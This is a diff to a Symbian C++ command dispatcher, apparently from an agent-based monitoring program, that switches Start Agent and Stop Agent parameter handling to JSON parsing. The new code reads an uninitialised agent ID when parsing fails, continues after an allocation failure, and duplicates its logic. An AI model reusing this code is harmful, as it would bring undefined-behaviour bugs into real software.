@@ -402,18 +402,70 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 			{
 			case EAction_StartAgent:
 				{
-				TUint32* paramsPtr = (TUint32*) action->iParams.Ptr();
-				TAgentType agentId = (TAgentType) *paramsPtr;
-				StartAgentL(agentId);
+				TAgentType agentId;
+				RBuf paramsBuf;
+				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
+				if(err == KErrNone)
+					{
+					paramsBuf.Copy(action->iParams);
+					}
+				else
+					{
+					//TODO: not enough memory
+					}
+								
+				paramsBuf.CleanupClosePushL();
+				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+				CleanupStack::PushL(jsonBuilder);
+				jsonBuilder->BuildFromJsonStringL(paramsBuf);
+				CJsonObject* rootObject;
+				jsonBuilder->GetDocumentObject(rootObject);
+				if(rootObject)
+					{
+					CleanupStack::PushL(rootObject);
+					agentId = (TAgentType) iConfig->GetModuleId(rootObject);
+					CleanupStack::PopAndDestroy(rootObject);
+					}
+				CleanupStack::PopAndDestroy(jsonBuilder);
+				CleanupStack::PopAndDestroy(&paramsBuf);
+				if(agentId>0)
+					StartAgentL(agentId);
 				break;
 				}
 			case EAction_StopAgent:
 				{
 				// Handles the two special cases Start Agent / Stop Agent because we have to check 
 				// if the Agent is already running and stop it, or create a new Agent and start it.
-				TUint32* paramsPtr = (TUint32*) action->iParams.Ptr();
-				TAgentType agentId = (TAgentType) *paramsPtr;
-				StopAgentL(agentId);
+				//TUint32* paramsPtr = (TUint32*) action->iParams.Ptr();
+				//TAgentType agentId = (TAgentType) *paramsPtr;
+				TAgentType agentId;
+				RBuf paramsBuf;
+				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
+				if(err == KErrNone)
+					{
+					paramsBuf.Copy(action->iParams);
+					}
+				else
+					{
+					//TODO: not enough memory
+					}
+												
+				paramsBuf.CleanupClosePushL();
+				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+				CleanupStack::PushL(jsonBuilder);
+				jsonBuilder->BuildFromJsonStringL(paramsBuf);
+				CJsonObject* rootObject;
+				jsonBuilder->GetDocumentObject(rootObject);
+				if(rootObject)
+					{
+					CleanupStack::PushL(rootObject);
+					agentId = (TAgentType) iConfig->GetModuleId(rootObject);
+					CleanupStack::PopAndDestroy(rootObject);
+					}
+				CleanupStack::PopAndDestroy(jsonBuilder);
+				CleanupStack::PopAndDestroy(&paramsBuf);
+				if(agentId>0)
+					StopAgentL(agentId);
 				break;
 				}
 			default:
